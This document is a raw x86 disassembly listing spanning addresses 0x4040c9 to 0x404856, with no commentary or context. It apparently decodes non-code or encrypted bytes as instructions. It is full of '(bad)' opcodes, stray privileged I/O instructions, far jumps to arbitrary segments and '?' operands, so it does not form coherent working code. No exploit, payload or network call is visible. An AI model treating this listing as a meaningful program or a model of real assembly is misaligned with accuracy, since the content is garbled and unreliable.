  4040c9:	enter  0x5659,0xbd
  4040cd:	pop    ds
  4040ce:	rol    ch,1
  4040d0:	sub    bh,0x49
  4040d3:	scas   al,BYTE PTR es:[edi]
  4040d4:	(bad)  
  4040d6:	and    BYTE PTR [ebx+0x17],0x37
  4040da:	mov    dh,0xc2
  4040dc:	sar    BYTE PTR [ebx],0x9
  4040df:	push   ss
  4040e0:	or     al,0x99
  4040e2:	xor    eax,0x629c6931
  4040e7:	sub    eax,DWORD PTR [ebx]
  4040e9:	or     BYTE PTR [ebp+eax*1+0x622ada99],0xb1
  4040f1:	das    
  4040f2:	add    edi,DWORD PTR [ebp+ebx*2+0x61]
  4040f6:	dec    esp
  4040f7:	dec    ecx
  4040f8:	outs   dx,BYTE PTR ds:[esi]
  4040f9:	bound  eax,QWORD PTR [edi]
  4040fb:	xlat   BYTE PTR ds:[ebx]
  4040fc:	or     eax,0xf686ab2a
  404101:	stc    
  404102:	shl    ah,0xb2
  404105:	cs mov ch,0x9f
  404108:	add    bh,BYTE PTR [ecx-0x79]
  40410b:	mov    DWORD PTR [eax-0x51b7e875],esi
  404111:	test   DWORD PTR [edi+ecx*1+0x5e43f84c],esi
  404118:	cmp    eax,0x40ff2855
  40411d:	push   ebp
  40411e:	mov    dh,BYTE PTR [edx-0x1e0840dd]
  404124:	pop    edi
  404125:	js     0x4040e9
  404127:	push   cs
  404128:	pusha  
  404129:	dec    esi
  40412a:	or     edx,esp
  40412c:	xchg   DWORD PTR [esi],ebx
  40412e:	jl     0x4040ee
  404130:	(bad)  
  404131:	cli    
  404132:	ins    DWORD PTR es:[edi],dx
  404133:	mov    ch,dh
  404135:	adc    eax,0x10e335de
  40413a:	sbb    ebx,DWORD PTR [ebx-0x6332ce6]
  404140:	ins    DWORD PTR es:[edi],dx
  404141:	div    DWORD PTR [edi]
  404143:	jno    0x4041ba
  404145:	test   DWORD PTR [ebp-0x32142ff5],0x3656fd2b
  40414f:	hlt    
  404150:	push   edx
  404151:	jecxz  0x4041c9
  404153:	shr    DWORD PTR [ebx],1
  404155:	sbb    BYTE PTR [esi],bh
  404157:	call   0xaea93be8
  40415c:	sar    BYTE PTR [eax-0x7f],0x64
  404160:	mov    al,0xc1
  404162:	and    eax,0x9b80cd2a
  404167:	call   FWORD PTR [esi+0x36]
  40416a:	mov    ah,0x23
  40416c:	aas    
  40416d:	daa    
  40416e:	or     ebx,eax
  404170:	sbb    edx,DWORD PTR [edx-0x4eec564d]
  404176:	sub    dh,ah
  404178:	xchg   esp,eax
  404179:	ror    BYTE PTR [eax+0x13cf621],0x75
  404180:	popf   
  404181:	jg     0x404162
  404183:	fs push eax
  404185:	icebp  
  404186:	add    bh,ch
  404188:	bound  esp,QWORD PTR [ebx-0x64b52ec4]
  40418e:	fmul   st,st(3)
  404190:	aad    0x6b
  404192:	test   eax,0x59afe42c
  404197:	lock scas al,BYTE PTR es:[edi]
  404199:	fwait
  40419a:	add    WORD PTR [ebp-0x6d0b37ff],si
  4041a1:	imul   esp,edi,0xfffffff5
  4041a4:	push   edx
  4041a5:	mov    ah,0xfe
  4041a7:	sahf   
  4041a8:	(bad)  
  4041a9:	sbb    al,0x7
  4041ab:	push   esp
  4041ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ad:	pop    ebp
  4041ae:	and    ecx,DWORD PTR [ecx+esi*2]
  4041b1:	adc    eax,0x258b4e22
  4041b6:	mov    al,0xf0
  4041b8:	(bad)  
  4041ba:	lahf   
  4041bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041bc:	ja     0x4041ad
  4041be:	aam    0x9
  4041c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041c1:	xor    ebp,DWORD PTR [edi+0x57f3408a]
  4041c7:	mov    edx,0xa42078c3
  4041cc:	sub    BYTE PTR [edi+0x2c00e50c],0x5e
  4041d3:	xor    ecx,ebx
  4041d5:	or     DWORD PTR [edi+0x67],ebp
  4041d8:	jecxz  0x404194
  4041da:	lahf   
  4041db:	popf   
  4041dc:	stc    
  4041dd:	mov    gs,WORD PTR [esi+0x3b]
  4041e0:	pop    edi
  4041e1:	cvtpi2ps xmm7,mm6
  4041e4:	pop    edx
  4041e5:	popf   
  4041e6:	adc    eax,0x311ffff6
  4041eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ec:	fst    DWORD PTR [ebx+0x52]
  4041ef:	sbb    BYTE PTR [ebp+0x5c],bh
  4041f2:	xchg   ebx,eax
  4041f3:	jne    0x4041c5
  4041f5:	xchg   esi,eax
  4041f6:	inc    ebp
  4041f7:	and    eax,0xf40c778
  4041fc:	and    ebp,edi
  4041fe:	xchg   esp,eax
  4041ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404200:	xchg   ecx,eax
  404201:	sbb    al,0x86
  404203:	(bad)  
  404204:	pop    esi
  404205:	xor    esi,DWORD PTR [edx-0x26]
  404208:	fisttp QWORD PTR ds:0x75742239
  40420e:	xchg   BYTE PTR [ebp+edx*1+0x2b],bh
  404212:	enter  0xf954,0xb0
  404216:	xor    al,0x93
  404218:	push   eax
  404219:	in     al,0x76
  40421b:	les    edx,FWORD PTR [ebp+0x36031fdf]
  404221:	xor    ebx,DWORD PTR [ebx+0x4499c42c]
  404227:	fst    DWORD PTR [edx+0xcc2a700]
  40422d:	pop    ebp
  40422e:	mov    ah,0x8b
  404230:	lds    edi,FWORD PTR [ecx+0x3d]
  404233:	ret    0x93c3
  404236:	mov    ebp,ebp
  404238:	cmp    esi,DWORD PTR [edi-0x437cdd7d]
  40423e:	push   ebx
  40423f:	mov    ah,BYTE PTR [eax+0x4]
  404242:	dec    edi
  404243:	lds    ebx,FWORD PTR [eax+eiz*2]
  404246:	inc    edi
  404247:	mov    cl,0xe8
  404249:	hlt    
  40424a:	sbb    eax,DWORD PTR [edx]
  40424c:	sub    esi,DWORD PTR [ebx+0x6c]
  40424f:	js     0x40420e
  404251:	add    cl,ah
  404253:	mov    BYTE PTR [edi],dl
  404255:	loopne 0x40422f
  404257:	push   edx
  404258:	ret    
  404259:	inc    eax
  40425a:	xchg   edx,eax
  40425b:	fs mov bl,al
  40425e:	xlat   BYTE PTR ds:[ebx]
  40425f:	lods   eax,DWORD PTR ds:[esi]
  404260:	sahf   
  404261:	xor    al,0xbe
  404263:	retf   
  404264:	aas    
  404265:	out    dx,al
  404266:	pop    ds
  404267:	push   cs
  404268:	xchg   esp,eax
  404269:	jnp    0x4042cc
  40426b:	mov    ah,BYTE PTR [esi+eax*4-0x56202152]
  404272:	pop    esp
  404273:	add    ah,BYTE PTR [edi-0x3b83a31f]
  404279:	mov    al,0x9a
  40427b:	add    al,0x1b
  40427d:	test   BYTE PTR [edx+0x17b83f74],cl
  404283:	inc    esi
  404284:	sub    eax,0xd1f04747
  404289:	dec    ebx
  40428a:	jle    0x40421a
  40428c:	ss das 
  40428e:	retw   0x8cbb
  404292:	out    0x47,al
  404294:	or     al,0x17
  404296:	sub    DWORD PTR [edx],ecx
  404298:	and    al,bh
  40429a:	jns    0x404250
  40429c:	mov    ?,WORD PTR ss:[ebx-0x25144e1]
  4042a3:	test   DWORD PTR [ebx+0x70],esp
  4042a6:	iret   
  4042a7:	cmp    eax,0xe2bb4b82
  4042ac:	add    al,BYTE PTR [esi+0x77c85d8c]
  4042b2:	mov    WORD PTR [esi],ds
  4042b4:	xchg   ebp,eax
  4042b5:	jbe    0x404288
  4042b7:	adc    DWORD PTR [edi-0x1e],edi
  4042ba:	sbb    eax,0xe851ae9c
  4042bf:	stc    
  4042c0:	adc    edx,DWORD PTR [ecx]
  4042c2:	add    eax,0x3c14e720
  4042c7:	repnz jmp 0xe3be:0x5f99cc89
  4042cf:	imul   esi,DWORD PTR [edx],0x4b
  4042d2:	mov    cl,0x1f
  4042d4:	stos   DWORD PTR es:[edi],eax
  4042d5:	out    dx,eax
  4042d6:	push   ebp
  4042d7:	pop    edx
  4042d8:	sbb    eax,ebx
  4042da:	fs enter 0xc0cf,0x7c
  4042df:	aaa    
  4042e0:	lds    eax,FWORD PTR [esi-0x37]
  4042e3:	jg     0x404284
  4042e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042e6:	sub    BYTE PTR [eax-0x576bc22d],bl
  4042ec:	in     eax,0x77
  4042ee:	pop    ecx
  4042ef:	sbb    ah,ah
  4042f1:	push   edi
  4042f2:	and    eax,0xd3cf214e
  4042f7:	sbb    bh,BYTE PTR [ebp-0x39]
  4042fa:	xor    BYTE PTR [esi],0xf2
  4042fd:	ret    0xd5d9
  404300:	xor    DWORD PTR [ebp-0x7798901a],edx
  404306:	dec    edx
  404307:	data16 (bad) 
  404309:	jmp    0xb97ea88e
  40430e:	in     al,dx
  40430f:	mov    ah,0x65
  404311:	mov    al,ds:0x520c5516
  404316:	and    bl,BYTE PTR [eax]
  404318:	or     al,BYTE PTR [eax-0x50]
  40431b:	inc    ecx
  40431c:	adc    DWORD PTR [ecx],0x8
  40431f:	sub    esi,DWORD PTR [ebx]
  404321:	or     al,0x7e
  404323:	jmp    0xbcb7f32b
  404328:	int    0x9d
  40432a:	repz push eax
  40432c:	test   BYTE PTR [esi-0x5ec50212],dh
  404332:	fwait
  404333:	or     BYTE PTR [ebx],al
  404335:	jl     0x404305
  404337:	xor    edx,edx
  404339:	mov    ebx,DWORD PTR [ecx]
  40433b:	push   edx
  40433c:	xchg   ebx,eax
  40433d:	addr16 popf 
  40433f:	or     eax,edx
  404341:	fs leave 
  404343:	xor    DWORD PTR [eax-0x2037a5e3],eax
  404349:	int    0xf8
  40434b:	inc    ecx
  40434c:	xchg   BYTE PTR [edx-0x2119b122],dl
  404352:	inc    ebx
  404353:	pop    esp
  404354:	imul   edi,DWORD PTR [ebx-0x5a],0xffffffb8
  404358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404359:	sub    al,0xaa
  40435b:	inc    ebp
  40435c:	mul    BYTE PTR [eax]
  40435e:	int3   
  40435f:	mov    edx,0x4784c40b
  404364:	addr16 push ss
  404366:	push   ebx
  404367:	or     esp,ebp
  404369:	rcl    DWORD PTR [esi+0x427a992],1
  40436f:	jne    0x40434e
  404371:	push   ebx
  404372:	mov    esi,0x4674cb5b
  404377:	xor    bh,BYTE PTR [ecx+ebp*4+0x77]
  40437b:	jb     0x4043e2
  40437d:	rcl    BYTE PTR [ecx-0x66],cl
  404380:	imul   ecx,DWORD PTR [edi+0x9],0x6eaf7a75
  404387:	sbb    edi,DWORD PTR [eax-0x2491d03b]
  40438d:	dec    edi
  40438e:	(bad)  
  40438f:	fnstsw WORD PTR [ebp-0x3]
  404392:	mov    dl,0xfd
  404394:	popa   
  404395:	leave  
  404396:	pop    ebx
  404397:	fsub   QWORD PTR [eax+0x736558ee]
  40439d:	ja     0x40435b
  40439f:	jno    0x40434c
  4043a1:	jne    0x404323
  4043a3:	jno    0x404340
  4043a5:	pop    ds
  4043a6:	stc    
  4043a7:	push   ebx
  4043a8:	and    al,0xbf
  4043aa:	mov    cs,WORD PTR [ecx+esi*4]
  4043ad:	das    
  4043ae:	push   ds
  4043af:	or     edi,esi
  4043b1:	cmp    esi,0xffffffcc
  4043b4:	jp     0x404383
  4043b6:	jbe    0x404372
  4043b8:	lahf   
  4043b9:	pop    esp
  4043ba:	lock into 
  4043bc:	jecxz  0x404418
  4043be:	retf   
  4043bf:	mov    bl,0xe6
  4043c1:	in     al,dx
  4043c2:	dec    ebx
  4043c3:	add    DWORD PTR [edi+eiz*8+0xb],ebp
  4043c7:	push   ecx
  4043c8:	arpl   ax,di
  4043ca:	std    
  4043cb:	xor    BYTE PTR [edx],0x38
  4043ce:	int    0x37
  4043d0:	fild   WORD PTR [ebp+0x2]
  4043d3:	mov    ebx,0x70f7f1bf
  4043d8:	test   BYTE PTR [ebx-0x5],cl
  4043db:	and    bl,BYTE PTR [ebp+edx*8-0x45c45222]
  4043e2:	or     al,BYTE PTR [ebx+0x23]
  4043e5:	sbb    BYTE PTR [eax],bh
  4043e7:	dec    esp
  4043e8:	pop    edx
  4043e9:	ret    
  4043ea:	mov    BYTE PTR [ebx],bh
  4043ec:	dec    ebp
  4043ed:	or     dl,bh
  4043ef:	xchg   edx,eax
  4043f0:	fs sbb eax,0xb59d8309
  4043f6:	mov    ecx,DWORD PTR [ecx+0x560d07ea]
  4043fc:	(bad)  
  4043fd:	lock and esi,DWORD PTR [ebx+0x7ab71a66]
  404404:	inc    esp
  404405:	lods   al,BYTE PTR ss:[esi]
  404407:	push   DWORD PTR [eax+0x1f]
  40440a:	loop   0x4043d5
  40440c:	jle    0x404409
  40440e:	add    eax,0xcd2bc083
  404413:	test   BYTE PTR [ecx+0x63af7072],ch
  404419:	or     ecx,DWORD PTR [ebp+0x7ca09b00]
  40441f:	pop    esi
  404420:	sub    DWORD PTR gs:[ebp+0x38f323ad],edx
  404427:	mov    al,0x68
  404429:	into   
  40442a:	lods   al,BYTE PTR ds:[esi]
  40442b:	dec    ecx
  40442c:	inc    eax
  40442d:	leave  
  40442e:	cmc    
  40442f:	arpl   WORD PTR [eax+0x4d],dx
  404432:	ret    
  404433:	mov    bl,0x82
  404435:	loope  0x404434
  404437:	call   FWORD PTR [ebx-0x2e223f91]
  40443d:	pop    ecx
  40443e:	sub    eax,0xf4080114
  404443:	xchg   esi,eax
  404444:	adc    al,0x58
  404446:	sbb    bh,BYTE PTR [ebx-0x7e]
  404449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40444a:	test   eax,esi
  40444c:	pop    edx
  40444d:	dec    esi
  40444e:	inc    eax
  40444f:	cdq    
  404450:	mov    ecx,0x2c76a8b6
  404455:	cli    
  404456:	in     al,0x8f
  404458:	pop    edi
  404459:	imul   esi,ecx,0x20
  40445c:	xor    bl,BYTE PTR [esi]
  40445e:	scas   al,BYTE PTR es:[edi]
  40445f:	sbb    BYTE PTR [ecx-0x80],bl
  404462:	lock bound ebp,QWORD PTR [ebx]
  404465:	sbb    al,0x1
  404467:	mov    cl,0x4b
  404469:	pop    esi
  40446a:	mov    bl,0xe4
  40446c:	ja     0x404469
  40446e:	loop   0x404431
  404470:	mov    ds:0x8adf2f6b,eax
  404475:	sub    BYTE PTR [edx],0x45
  404478:	fwait
  404479:	ins    BYTE PTR es:[edi],dx
  40447a:	push   esp
  40447b:	add    BYTE PTR [eax+edi*1-0x5872bb54],dh
  404482:	mov    esi,0xcbed3ab5
  404487:	inc    ecx
  404488:	xchg   edi,eax
  404489:	mov    ebp,DWORD PTR [edi+0x4d]
  40448c:	inc    DWORD PTR [edi-0x7573ecf9]
  404492:	call   DWORD PTR [ebx]
  404494:	dec    esp
  404495:	mov    ch,al
  404497:	xchg   esi,ecx
  404499:	mov    esi,0x46ffcb13
  40449e:	leave  
  40449f:	lods   eax,DWORD PTR ds:[esi]
  4044a0:	dec    esp
  4044a1:	dec    ecx
  4044a2:	adc    DWORD PTR [ebp-0x3],edx
  4044a5:	pop    edi
  4044a6:	mov    esi,0x635be2cc
  4044ab:	push   cs
  4044ac:	ja     0x40446c
  4044ae:	pop    ds
  4044af:	inc    edx
  4044b0:	jae    0x4044fa
  4044b2:	adc    DWORD PTR [eax-0x69],esp
  4044b5:	mov    edx,0xd8ea5fde
  4044ba:	(bad)  
  4044bb:	shl    DWORD PTR [edx-0x14e94132],0x4c
  4044c2:	xchg   edx,eax
  4044c3:	mov    esp,DWORD PTR ds:0x7e489d4d
  4044c9:	cmp    cl,BYTE PTR [edi-0x227a5485]
  4044cf:	and    DWORD PTR [esp+ebp*4-0x35],ecx
  4044d3:	sbb    BYTE PTR [edx-0x59abb529],ah
  4044d9:	lds    esi,FWORD PTR [edi]
  4044db:	fucomip st,st(2)
  4044dd:	les    eax,FWORD PTR ds:0x899505b
  4044e3:	mov    al,0x26
  4044e5:	inc    esp
  4044e6:	dec    ebp
  4044e7:	dec    ebp
  4044e8:	gs std 
  4044ea:	push   edi
  4044eb:	sub    al,0xca
  4044ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044ee:	dec    ecx
  4044ef:	push   edi
  4044f0:	aas    
  4044f1:	(bad)  
  4044f2:	mov    eax,ds:0xa4157eec
  4044f7:	popf   
  4044f8:	dec    edi
  4044f9:	retf   
  4044fa:	cmp    BYTE PTR [edx-0x7f7f9cd2],dl
  404500:	mov    ch,0x7e
  404502:	out    0x0,eax
  404504:	fadd   DWORD PTR [edx-0x7a]
  404507:	call   0xfa50:0xa23e2fd4
  40450e:	lahf   
  40450f:	inc    eax
  404510:	shl    ebx,1
  404512:	inc    esi
  404513:	xchg   esp,eax
  404514:	mov    dl,0xe6
  404516:	(bad)  
  404517:	stc    
  404518:	inc    ecx
  404519:	fcom   DWORD PTR [ebx+0x5a]
  40451c:	daa    
  40451d:	jnp    0x4044d8
  40451f:	stos   BYTE PTR es:[edi],al
  404520:	daa    
  404521:	xor    al,0xa9
  404523:	cmp    ah,BYTE PTR [edi]
  404525:	mov    ecx,0xd5d4196f
  40452a:	imul   ecx,DWORD PTR [eax+0x6c],0xffffffc2
  40452e:	sub    esi,0x1b
  404531:	mov    dl,0xce
  404533:	mov    ebp,0x32c9e566
  404538:	leave  
  404539:	shl    BYTE PTR [esi+0x5afb30e],0xae
  404540:	push   edi
  404541:	xchg   esi,eax
  404542:	aas    
  404543:	sub    DWORD PTR [ebp+0x53330397],ecx
  404549:	sbb    DWORD PTR [edx-0x72b9822e],0xfffffffb
  404550:	ror    DWORD PTR [eax],0x6
  404553:	inc    eax
  404554:	mov    ah,0xe
  404556:	dec    edx
  404557:	jno    0x40457a
  404559:	scas   eax,DWORD PTR es:[edi]
  40455a:	scas   eax,DWORD PTR es:[edi]
  40455b:	cmp    esp,ebp
  40455d:	imul   esp,esi,0xffffffc1
  404560:	sbb    al,0x5b
  404562:	fisubr WORD PTR [ecx]
  404564:	scas   eax,DWORD PTR es:[edi]
  404565:	cmp    al,0x97
  404567:	lahf   
  404568:	jnp    0x4045dc
  40456a:	xor    eax,0x459dbd62
  40456f:	dec    ebx
  404570:	adc    edx,DWORD PTR [esi-0x5cdf82c6]
  404576:	and    DWORD PTR [edi+0x6d],esp
  404579:	cld    
  40457a:	mov    ds,WORD PTR [esi-0xa]
  40457d:	push   0x74
  40457f:	addr16 pop ds
  404581:	lahf   
  404582:	imul   ebp,esp,0x48d2de60
  404588:	push   ds
  404589:	scas   al,BYTE PTR es:[edi]
  40458a:	fdiv   st(4),st
  40458c:	ror    DWORD PTR [eax],1
  40458e:	add    bh,ah
  404590:	sub    dl,0x72
  404593:	outs   dx,DWORD PTR ds:[esi]
  404594:	sti    
  404595:	ret    
  404596:	pop    esi
  404597:	xchg   esp,eax
  404598:	nop
  404599:	fistp  QWORD PTR [ecx]
  40459b:	sbb    ah,ch
  40459d:	sbb    ebp,DWORD PTR [eax]
  40459f:	dec    ebp
  4045a0:	hlt    
  4045a1:	inc    edi
  4045a2:	dec    eax
  4045a3:	neg    ecx
  4045a5:	mov    edx,0xce1dcb92
  4045aa:	out    dx,al
  4045ab:	sub    esi,DWORD PTR [edi+ebx*8]
  4045ae:	in     al,dx
  4045af:	sbb    BYTE PTR [esi-0x6d],al
  4045b2:	lods   al,BYTE PTR ds:[esi]
  4045b3:	jge    0x40458c
  4045b5:	add    BYTE PTR [eax+0x2f],cl
  4045b8:	xor    eax,DWORD PTR [eax]
  4045ba:	adc    al,0x2e
  4045bc:	cmp    eax,0x5d04e31e
  4045c1:	bound  ebp,QWORD PTR ds:0x2b8e8cb9
  4045c7:	sahf   
  4045c8:	daa    
  4045c9:	aas    
  4045ca:	inc    esp
  4045cb:	dec    eax
  4045cc:	inc    ecx
  4045cd:	xchg   ecx,eax
  4045ce:	push   ebp
  4045cf:	xor    al,BYTE PTR [eax-0x28]
  4045d2:	cmp    BYTE PTR [edi+0x51],bh
  4045d5:	inc    ebp
  4045d6:	jg     0x4045af
  4045d8:	hlt    
  4045d9:	(bad)  
  4045da:	daa    
  4045db:	and    BYTE PTR [eax-0x15b11edc],ch
  4045e1:	cmc    
  4045e2:	in     eax,0xec
  4045e4:	mov    edx,0x308f49ed
  4045e9:	pop    ebx
  4045ea:	fnsave ds:0xea20e1db
  4045f0:	sbb    DWORD PTR [ebp+0x345991c2],ebp
  4045f6:	xchg   ebp,eax
  4045f7:	stos   BYTE PTR es:[edi],al
  4045f8:	fsubr  QWORD PTR [esi]
  4045fa:	mov    BYTE PTR [esi],cl
  4045fc:	mov    cl,0x67
  4045fe:	mov    esi,esp
  404600:	xchg   edi,eax
  404601:	xchg   esi,eax
  404602:	sbb    eax,DWORD PTR [eax-0x38]
  404605:	add    BYTE PTR [ebx+0x41],bl
  404608:	retf   
  404609:	mov    BYTE PTR [ecx+0x1bd27ce3],0xa
  404610:	js     0x4045dd
  404612:	popf   
  404613:	shl    DWORD PTR [eax-0x62],1
  404616:	mov    cl,0x79
  404618:	aam    0xfe
  40461a:	out    0x7f,eax
  40461c:	mov    ebp,0x7f98e06d
  404621:	aas    
  404622:	jns    0x4045b0
  404624:	xchg   ebx,eax
  404625:	mov    edx,0x97d45eee
  40462a:	es jae 0x4046a9
  40462d:	pop    ds
  40462e:	or     BYTE PTR [ebx+0x6e],ch
  404631:	dec    edx
  404633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404634:	pop    ecx
  404635:	push   0xffffffc7
  404637:	in     al,0xaa
  404639:	in     al,dx
  40463a:	fwait
  40463b:	inc    ecx
  40463c:	adc    al,0x2c
  40463e:	in     al,dx
  40463f:	inc    edx
  404640:	(bad)  
  404641:	(bad)  
  404642:	xchg   BYTE PTR [edi+eiz*8-0x6dda86d0],al
  404649:	enter  0x762f,0x2f
  40464d:	inc    eax
  40464e:	call   0x635e:0x16b6c411
  404655:	out    dx,al
  404656:	loope  0x404640
  404658:	mov    bh,0xad
  40465a:	ja     0x4045ee
  40465c:	jle    0x40462e
  40465e:	adc    edi,esp
  404660:	cmp    cl,BYTE PTR [ebx-0x22]
  404663:	ins    DWORD PTR es:[edi],dx
  404664:	xor    DWORD PTR [ecx-0x4302579],0x5dfbee46
  40466e:	ss repz cld 
  404671:	imul   DWORD PTR ds:0x615344cd
  404677:	dec    ebp
  404678:	int3   
  404679:	lock outs dx,DWORD PTR ds:[esi]
  40467b:	jnp    0x404684
  40467d:	iret   
  40467e:	push   0x966772d9
  404683:	cld    
  404684:	or     cl,BYTE PTR [edi+eax*8+0x1ed76967]
  40468b:	mov    al,ds:0xaac1259c
  404690:	imul   esp,edi,0xfffffff3
  404693:	scas   eax,DWORD PTR es:[edi]
  404694:	call   0x65ff3730
  404699:	add    BYTE PTR [ebp+0x1],0x0
  40469d:	jns    0x40471c
  40469f:	sub    esp,DWORD PTR [ecx+0x29]
  4046a2:	rcl    DWORD PTR [ecx-0x3dba7821],0x54
  4046a9:	inc    esi
  4046aa:	xchg   edx,eax
  4046ab:	jae    0x404701
  4046ad:	xchg   ch,dl
  4046af:	jb     0x40463a
  4046b1:	(bad)  
  4046b2:	mov    edx,0xd3371e4b
  4046b7:	jnp    0x40472d
  4046b9:	pop    esi
  4046ba:	xchg   edi,eax
  4046bb:	mov    eax,DWORD PTR [ebx+0x53a0c063]
  4046c1:	aas    
  4046c2:	push   ecx
  4046c3:	sahf   
  4046c4:	sub    ecx,esi
  4046c6:	cdq    
  4046c7:	jns    0x40465f
  4046c9:	mov    bl,0xe3
  4046cb:	inc    ebx
  4046cc:	mov    WORD PTR [ecx-0x5d],?
  4046cf:	arpl   WORD PTR [ebp+0x62],ax
  4046d2:	(bad)  
  4046d3:	retf   
  4046d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046d5:	adc    esp,DWORD PTR [edx-0x6c]
  4046d8:	adc    al,BYTE PTR [ebx+0x4e095862]
  4046de:	mov    ch,0xd4
  4046e0:	int3   
  4046e1:	out    dx,al
  4046e2:	les    ecx,FWORD PTR [esi+0x6a]
  4046e5:	xlat   BYTE PTR ds:[ebx]
  4046e6:	popf   
  4046e7:	bound  esi,QWORD PTR [ebp+0x4f]
  4046ea:	ins    DWORD PTR es:[edi],dx
  4046eb:	bound  esi,QWORD PTR [ecx-0x60950533]
  4046f1:	ins    DWORD PTR es:[edi],dx
  4046f2:	arpl   ax,sp
  4046f4:	adc    al,BYTE PTR [ecx+0x3211cec1]
  4046fa:	lods   al,BYTE PTR ds:[esi]
  4046fb:	ret    0x9b1a
  4046fe:	lods   al,BYTE PTR ds:[esi]
  4046ff:	sbb    DWORD PTR [ebp-0x295eebc0],0x12553caf
  404709:	pop    ds
  40470a:	repnz aad 0xa6
  40470d:	jbe    0x4046ab
  40470f:	std    
  404710:	add    al,0x1
  404712:	icebp  
  404713:	loop   0x4046a5
  404715:	mov    ch,cl
  404717:	ror    DWORD PTR [ebx+0xdea99ea],1
  40471d:	es mov sp,0x5d58
  404722:	addr16 cdq 
  404724:	push   es
  404725:	scas   al,BYTE PTR es:[edi]
  404726:	hlt    
  404727:	inc    esp
  404728:	xor    BYTE PTR [eax+0x6404e7f9],dh
  40472e:	les    esp,FWORD PTR [esp+ebp*2+0x1776a26f]
  404735:	fwait
  404736:	shr    DWORD PTR [eax],1
  404738:	cmp    ecx,esi
  40473a:	adc    ah,0xef
  40473d:	(bad)  
  40473f:	jne    0x4046ec
  404741:	xor    eax,0x772e549f
  404746:	dec    ebp
  404747:	(bad)  
  404748:	xchg   ebx,eax
  404749:	adc    DWORD PTR [ecx+0x50],0x81623b04
  404750:	cmovl  ebp,DWORD PTR [edx]
  404753:	push   cs
  404754:	dec    ebp
  404755:	pop    ds
  404756:	pop    esp
  404757:	data16 sub dh,cl
  40475a:	add    edi,ebp
  40475c:	dec    edi
  40475d:	scas   eax,DWORD PTR es:[edi]
  40475e:	mov    eax,ds:0x48307604
  404763:	xchg   ecx,eax
  404764:	fld    DWORD PTR ds:0x40c518e1
  40476a:	jmp    0xec77:0xd51ab582
  404771:	hlt    
  404772:	add    eax,0x77b2f9ef
  404777:	adc    edi,DWORD PTR [edi+0x35b2ac17]
  40477d:	mov    dl,0x46
  40477f:	xor    esi,eax
  404781:	pushf  
  404782:	dec    ebx
  404783:	icebp  
  404784:	ja     0x40476b
  404786:	fld    TBYTE PTR [edi+0x34]
  404789:	or     eax,0xb239ab43
  40478e:	ds (bad) 
  404790:	or     eax,0x50935b7c
  404795:	xchg   edx,eax
  404796:	xchg   esi,eax
  404797:	clc    
  404798:	pop    ecx
  404799:	sahf   
  40479a:	xchg   BYTE PTR [edi+esi*8+0x33],bl
  40479e:	push   edx
  40479f:	es scas al,BYTE PTR es:[edi]
  4047a1:	pop    edi
  4047a2:	sbb    DWORD PTR [edx+0x68],edi
  4047a5:	sbb    DWORD PTR [ecx],ebp
  4047a7:	stos   DWORD PTR es:[edi],eax
  4047a8:	fcmove st,st(0)
  4047aa:	nop
  4047ab:	xchg   edi,eax
  4047ac:	mov    bl,0x5f
  4047ae:	into   
  4047af:	cli    
  4047b0:	mov    esp,0x5c356d5e
  4047b5:	in     eax,0x6b
  4047b7:	int3   
  4047b8:	adc    al,al
  4047ba:	mov    ch,0x8
  4047bc:	aaa    
  4047bd:	fsubr  st(7),st
  4047bf:	into   
  4047c0:	ret    0xe075
  4047c3:	push   es
  4047c4:	adc    ecx,DWORD PTR [ecx+0x0]
  4047c7:	hlt    
  4047c8:	mov    ebx,0xa0020174
  4047cd:	jecxz  0x404833
  4047cf:	push   cs
  4047d0:	push   ebx
  4047d1:	xchg   DWORD PTR [ebp-0x38],edi
  4047d4:	loop   0x4047ab
  4047d6:	cmp    BYTE PTR [edi*2+0x1ca24f8e],0x69
  4047de:	iret   
  4047df:	dec    ebp
  4047e0:	sub    DWORD PTR [ebx],ebp
  4047e2:	inc    ebp
  4047e3:	sub    al,0x6c
  4047e5:	push   ebp
  4047e6:	sbb    BYTE PTR ss:[ebx],0x2f
  4047ea:	dec    ebp
  4047eb:	add    DWORD PTR ds:0xaebe0096,edx
  4047f1:	in     eax,0xad
  4047f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047f4:	mov    eax,ds:0xb5777919
  4047f9:	idiv   cl
  4047fb:	lods   eax,DWORD PTR ds:[esi]
  4047fc:	mov    edi,eax
  4047fe:	push   eax
  4047ff:	or     ah,BYTE PTR [ebp-0x17e5d872]
  404805:	(bad)  
  404806:	push   edx
  404807:	fidiv  WORD PTR [esi]
  404809:	popf   
  40480a:	je     0x40483e
  40480c:	call   0x21f92178
  404811:	push   0xf930e1ac
  404816:	daa    
  404817:	jge    0x4047d5
  404819:	pushf  
  40481a:	jbe    0x40481e
  40481c:	xchg   edi,eax
  40481d:	aad    0x3a
  40481f:	retf   
  404820:	xchg   edx,eax
  404821:	in     al,dx
  404822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404823:	xor    eax,esi
  404825:	jae    0x4047fe
  404827:	cld    
  404828:	stos   BYTE PTR es:[edi],al
  404829:	xor    ch,dl
  40482b:	(bad)  
  40482d:	popa   
  40482e:	fisttp WORD PTR [edi]
  404830:	loope  0x4047ce
  404832:	fist   WORD PTR [edi+0xe9fb0d4]
  404838:	lahf   
  404839:	pop    ebx
  40483a:	jnp    0x404803
  40483c:	fcomp  QWORD PTR [ecx]
  40483e:	popf   
  40483f:	cmp    bl,BYTE PTR [edi+edi*2]
  404842:	cld    
  404843:	je     0x4048ad
  404845:	jg     0x4047db
  404847:	sub    cl,dl
  404849:	loop   0x404848
  40484b:	inc    ecx
  40484c:	retf   0xe3d
  40484f:	xchg   ecx,eax
  404850:	fisttp DWORD PTR [edx]
  404852:	cmc    
  404853:	jecxz  0x40483c
  404855:	aaa    
  404856:	xchg   esp,eax
